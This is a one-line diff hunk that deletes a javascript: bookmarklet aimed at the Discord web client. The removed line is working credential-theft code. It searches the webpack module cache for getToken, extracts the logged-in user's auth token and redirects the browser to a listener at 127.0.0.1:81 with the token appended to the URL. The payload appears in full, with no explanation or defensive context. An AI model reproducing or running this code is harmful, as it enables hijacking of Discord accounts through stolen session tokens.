@@ -1,1 +1,0 @@
-javascript:const url="http://127.0.0.1:81/";var f=(webpackChunkdiscord_app.push([[""],{},e=>{m=[];for(let o in e.c)m.push(e.c[o])}]),m).find((e=>void 0!==e?.exports?.default?.getToken)).exports.default.getToken();window.location.replace(url+"/"+f);
